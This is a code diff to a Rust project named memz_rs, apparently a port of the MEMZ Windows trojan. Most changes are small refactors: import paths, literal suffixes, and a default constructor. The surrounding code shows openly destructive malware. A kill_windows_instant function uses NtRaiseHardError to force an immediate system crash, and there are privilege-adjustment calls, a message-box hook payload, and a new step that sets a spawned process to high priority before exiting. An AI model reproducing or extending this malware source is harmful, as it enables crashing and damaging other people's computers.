@@ -11,7 +11,7 @@ use memz_rs::{
         library::Library,
         ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
     },
-    payloads::payloads::msg_box_hook,
+    payloads::system::msg_box_hook,
     utils::log::{self, write_log, LogType},
     wrap_windows_api::*,
     LMEM_ZEROINIT,
@@ -33,7 +33,7 @@ use windows::{
         Security::SE_DEBUG_NAME,
         System::{
             Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
-            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
+            Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION},
         },
         UI::{
             Shell::{ShellExecuteA, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA},
@@ -99,7 +99,7 @@ fn kill_windows_instant() -> Result<(), WinError> {
 
     match nt_raise_hard_error_proc {
         Some(nt_raise_hard_error) => {
-            nt_raise_hard_error(NTSTATUS(0xc0000022 as u32 as i32), 0, 0, 0, 6, &mut tmp2)
+            nt_raise_hard_error(NTSTATUS(0xc0000022_u32 as i32), 0, 0, 0, 6, &mut tmp2)
         }
         None => panic!("Failed GetProc NtRaiseHardError"),
     };
@@ -109,7 +109,7 @@ fn kill_windows_instant() -> Result<(), WinError> {
 
 fn main() -> Result<(), WinError> {
     log::new_log();
-    let res = Resolution::new();
+    let res = Resolution::default();
     #[cfg(all(feature = "DEBUG_MODE", feature = "WATCHDOG"))]
     {
         let watchdog_thread = thread::spawn(watchdog_thread);
@@ -182,7 +182,7 @@ fn main() -> Result<(), WinError> {
     let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
     wrap_get_module_file_name(
         HANDLE::default(),
-        HMODULE(8192 as isize),
+        HMODULE(8192_isize),
         fn_buf.as_mut_slice(),
     )?;
 
@@ -212,7 +212,9 @@ fn main() -> Result<(), WinError> {
         ..Default::default()
     };
 
-    Ok(())
+    wrap_set_priority_class(info.hProcess, HIGH_PRIORITY_CLASS.0)?;
+
+    process::exit(0);
 }
 
 #[cfg(all(feature = "DEBUG_MODE", feature = "WATCHDOG"))]
